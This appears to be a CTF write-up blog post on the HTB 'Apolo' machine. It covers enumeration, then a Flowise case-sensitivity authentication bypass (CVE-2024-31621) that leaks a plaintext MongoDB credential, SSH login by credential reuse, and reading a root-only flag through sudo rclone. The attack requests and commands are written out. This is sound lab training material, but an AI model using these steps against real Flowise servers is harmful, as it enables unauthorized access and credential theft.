---
title: HTB University CTF 2024 (Apolo)
description: On the 13th to 15th December 2024, I participated in HTB University CTF 2024 Binary Badlands with UiTM. I managed to solve Apolo challenge.
categories:
 - Writeup
 - HTB
tags:
- htb
- ctf
---

![Banner](/assets/img/htb-apolo-2024/banner.png)

## Enumeration Phase

### Nmap Scan

```zsh
$ nmap -sV -A -p- 10.129.246.166 > nmap.txt | cat nmap.txt

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-13 22:10 +08
Nmap scan report for apolo.htb (10.129.246.166)
Host is up (0.027s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Apolo
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

Add the following line to `/etc/hosts`{: .filepath} :
```
10.129.246.166  apolo.htb
```

Opening `apolo.htb`{: .filepath} in browser will show us the main page.

![Enum1](/assets/img/htb-apolo-2024/enum1.png)

Seems like there's nothing interesting here.

#### Subdomain Enumeration

```
ffuf -u http://apolo.htb -H "Host: FUZZ.apolo.htb" -w /path/to/wordlist -fc 302
```

![Enum2](/assets/img/htb-apolo-2024/enum2.png)

> We got a hit at `ai.apolo.htb`{: .filepath}. Now add it to `/etc/hosts`{: .filepath} just like earlier.
{: .prompt-info }

```
10.129.246.166  ai.apolo.htb
```

Opening `ai.apolo.htb`{: .filepath} in our browser will show some type of login page (I forgot to take a screenshot).

## Exploitation Phase
### Finding Vulnerability: Flowise Authentication Bypass

When searching for exploits, I stumbled upon [CVE-2024-31621](https://www.exploit-db.com/exploits/52001).

> **CVE-2024-31621** is a critical vulnerability identified in Flowise, a product by FlowiseAI Inc., affecting versions up to and including 1.6.2. This vulnerability allows a remote attacker to execute arbitrary code by sending a crafted script to the api/v1 component
{: .prompt-warning }

Sending a request at `/API/V1/credentials`{: .filepath} will returns this response.

```json
  {
    "id": "6cfda83a-b055-4fd8-a040-57e5f1dae2eb",
    "name": "MongoDB",
    "credentialName": "mongoDBUrlApi",
    "createdDate": "2024-11-14T09:02:56.000Z",
    "updatedDate": "2024-11-14T09:02:56.000Z"
  }
```
Using the **id** earlier we can send another request at `/API/V1/credentials/6cfda83a-b055-4fd8-a040-57e5f1dae2eb`{: .filepath}. This will returns.

```json
{
  "id": "6cfda83a-b055-4fd8-a040-57e5f1dae2eb",
  "name": "MongoDB",
  "credentialName": "mongoDBUrlApi",
  "createdDate": "2024-11-14T09:02:56.000Z",
  "updatedDate": "2024-11-14T09:02:56.000Z",
  "plainDataObj": {
    "mongoDBConnectorUrl": "mongodb+srv://lewis:Compl3xi3Ty!_W1n3@cluster0.mongodb.net/myDatabase?retryWrites=true&w=majority"
  }
  ```
  Here's how it looks at Burpsuite.

![User1](/assets/img/htb-apolo-2024/user1.png)

### User Flag

From the response earlier, managed to obtain a credential:
`lewis:Compl3xi3Ty!` 

Now we can SSH as **lewis** and get the User Flag.

![User-Flag](/assets/img/htb-apolo-2024/userflag.png)

```
HTB{llm_ex9l01t_4_RC3}
```
**User Flag:** `HTB{llm_ex9l01t_4_RC3}`

### Root Flag
#### Privilege Escalation
```zsh
sudo -l
```

Seems like **lewis** has permission to use sudo on `rclone`.

![Root1](/assets/img/htb-apolo-2024/root1.png)

Now we can inject our command to get the Root Flag

```zsh
sudo rclone cat /root/flag.txt
```

![Root-Flag](/assets/img/htb-apolo-2024/rootflag.png)

```
HTB{cl0n3_rc3_f1l3}
```
**Root Flag:** `HTB{cl0n3_rc3_f1l3}`

## Summary

- **API Vulnerabilities:** A case-sensitivity flaw in Flowise's authentication middleware has led to unauthorized API access. Highlighting the importance of robust validation mechanisms.
- **Credential Reuse:** The reuse of MongoDB credentials for SSH highlighted the critical importance of using unique credentials for different services.
- **Misconfigured Sudo Permissions:** Granting unrestricted sudo access to a powerful tool like Rclone can result in privilege escalation. Adhering to the principle of least privilege is essential.